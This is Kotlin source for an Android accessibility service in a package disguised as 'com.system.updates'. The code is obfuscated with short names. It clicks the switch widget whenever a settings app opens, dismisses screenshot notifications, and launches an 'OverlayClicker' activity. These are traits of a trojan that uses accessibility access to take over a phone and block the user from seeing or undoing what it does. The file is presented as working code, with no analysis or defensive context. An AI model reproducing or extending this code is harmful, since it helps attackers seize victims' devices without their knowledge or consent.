package com.system.updates

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.content.Intent
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import android.widget.Toast

class AccessibilityService : AccessibilityService() {
    private var oc=false
    override fun onServiceConnected() {
        super.onServiceConnected()
        val i=AccessibilityServiceInfo()
        i.eventTypes=AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED or
                AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED or
                AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED or
                AccessibilityEvent.TYPE_VIEW_CLICKED
        i.feedbackType=AccessibilityServiceInfo.FEEDBACK_GENERIC
        i.flags=i.flags or AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS or
                AccessibilityServiceInfo.FLAG_REQUEST_TOUCH_EXPLORATION_MODE
        serviceInfo=i
        oc=true
    }

    override fun onAccessibilityEvent(e: AccessibilityEvent) {
        when(e.eventType){
            AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED->{
                if(e.packageName=="com.android.systemui" && e.text.toString().contains("screenshot")){
                    performGlobalAction(GLOBAL_ACTION_NOTIFICATIONS)
                    rootInActiveWindow?.let{ fd(it) }
                }
            }
            AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED->{
                if(e.packageName?.contains("settings")==true){
                    val r=rootInActiveWindow
                    r?.let{ fc(it,"android:id/switch_widget") }
                }
            }
            AccessibilityEvent.TYPE_VIEW_CLICKED->{
                if(!oc){
                    val i=Intent(this,OverlayClicker::class.java)
                    i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                    startActivity(i)
                }
            }
        }
    }

    private fun fd(n:AccessibilityNodeInfo):Boolean{
        for(i in 0 until n.childCount){
            val c=n.getChild(i)?:continue
            if(c.className=="android.widget.Button" && c.text.toString().contains("dismiss",true)){
                c.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                return true
            }
            if(fd(c)) return true
        }
        return false
    }

    private fun fc(n:AccessibilityNodeInfo,id:String):Boolean{
        if(n.viewIdResourceName?.endsWith(id)==true){
            n.performAction(AccessibilityNodeInfo.ACTION_CLICK)
            return true
        }
        for(i in 0 until n.childCount){
            val c=n.getChild(i)?:continue
            if(fc(c,id)) return true
        }
        return false
    }

    override fun onInterrupt() {}
}